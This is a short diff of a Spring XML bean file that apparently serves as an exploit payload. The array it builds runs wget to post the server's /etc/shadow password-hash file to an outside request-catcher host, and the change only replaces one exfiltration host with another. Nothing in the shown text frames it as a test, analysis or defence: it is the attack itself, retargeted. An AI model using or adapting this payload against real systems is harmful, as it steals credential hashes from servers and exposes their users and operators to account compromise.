@@ -5,7 +5,7 @@
         <constructor-arg>
             <array>
                 <value>/usr/bin/wget</value>
-                <value>https://dlf-madrid.free.beeceptor.com</value>
+                <value>https://s3curitybug.free.beeceptor.com</value>
                 <value>--post-file</value>
                 <value>/etc/shadow</value>       
             </array>
